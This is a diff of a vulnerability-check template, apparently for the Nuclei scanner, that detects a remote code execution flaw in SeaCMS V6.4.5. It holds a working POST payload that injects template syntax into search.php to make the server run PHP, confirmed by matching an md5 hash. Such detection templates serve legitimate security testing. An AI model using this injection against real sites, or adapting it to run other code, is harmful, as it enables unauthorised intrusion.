@@ -1,31 +1,27 @@
 id: seacms-rce
-
 info:
   name: SeaCMS V6.4.5 RCE
   author: pikpikcu
   severity: high
   description: A vulnerability in SeaCMS allows remote unauthenticated attackers to execute arbitrary PHP code.
   reference:
-    - https://mengsec.com/2018/08/06/SeaCMS-v6-45前台代码执行漏洞分析/
+    - https://mengsec.com/2018/08/06/SeaCMS-v6-45%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
   metadata:
     max-request: 1
-  tags: seacms,rce,vuln
-
+  tags: rce,seacms,vuln
 http:
-  - method: POST
+  - body: searchtype=5&order=}{end if} {if:1)echo md5('seacms');if(1}{end if}
+    matchers:
+      - part: body
+        type: word
+        words:
+          - b1e597fa44dfd7669966bfab04eeb8ea
+      - status:
+          - 200
+        # digest: 4b0a00483046022100d2a1d73969bf522bef3c6b96580cd2f53adc354eac8f50b1ca2b95a944c99f0b022100ddf0cf8c3c27f4472f3e44c189326aacac7d5df73fb5fa392109ef78455e2c8d:922c64590222798bb761d5b6d8e72950
+
+        type: status
+    matchers-condition: and
+    method: POST
     path:
       - '{{BaseURL}}/search.php?searchtype=5'
-
-    body: "searchtype=5&order=}{end if} {if:1)echo md5('seacms');if(1}{end if}"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "b1e597fa44dfd7669966bfab04eeb8ea"
-
-      - type: status
-        status:
-          - 200
-
